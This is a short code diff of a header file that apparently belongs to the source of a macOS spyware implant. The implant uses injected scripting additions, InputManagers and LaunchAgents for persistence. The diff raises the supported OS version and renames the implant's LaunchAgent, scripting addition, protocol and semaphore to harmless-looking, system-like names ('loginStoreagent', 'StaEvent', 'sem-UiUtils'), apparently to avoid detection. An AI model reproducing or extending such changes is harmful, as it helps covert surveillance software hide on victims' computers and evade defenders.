@@ -36,11 +36,11 @@
 #define RCS8_UPDATE_XPC       @"pe-9-8dv.cpx"
 
 #define OSMAJOR_VER 10
-#define OSMINOR_MAX_VER 8
+#define OSMINOR_MAX_VER 9
 #define OSMINOR_MIN_VER 5
 
 // Protocol definition for all the agents, they must conform to this
-@protocol Agents
+@protocol __m_Agents
 
 - (void)start;
 - (BOOL)stop;
@@ -125,10 +125,11 @@ typedef struct os_version {
 #pragma mark -
 #pragma mark General Parameters
 #pragma mark -
+#define PROCESSINFO_SEL process_i_e
 
 // OSAX Strings
 #define OSAX_FOLDER @"ScriptingAdditions"
-#define OSAX_NAME   @"UIServerEvents"
+#define OSAX_NAME   @"StaEvent"
 
 // InputManager names
 #define IM_FOLDER     @"InputManagers"
@@ -143,7 +144,7 @@ typedef struct os_version {
 #define LAUNCHD_DIR       @"LaunchAgents"
 #define DOMAIN_COM        @"com"
 #define DOMAIN_APL        @"apple"
-#define LAUNCHD_NAME      @"UIServerLogin"
+#define LAUNCHD_NAME      @"loginStoreagent"
 #define LAUNCHD_EXT       @"plist"
 
 // XXX- FIXED
@@ -181,7 +182,7 @@ extern int gMemLogMaxSize;
 
 //#define SHMEM_COMMAND_MAX_SIZE  0x3000
 //#define SHMEM_LOG_MAX_SIZE      0x302460
-#define SHMEM_SEM_NAME              @"sem-mdworker"
+#define SHMEM_SEM_NAME              @"sem-UiUtils"
 #define SHMEM_LOG_MAX_NUM_BLOCKS    315
 #define SHMEM_LOG_MIN_NUM_BLOCKS    50
 #define READ_XPC_CMD                0
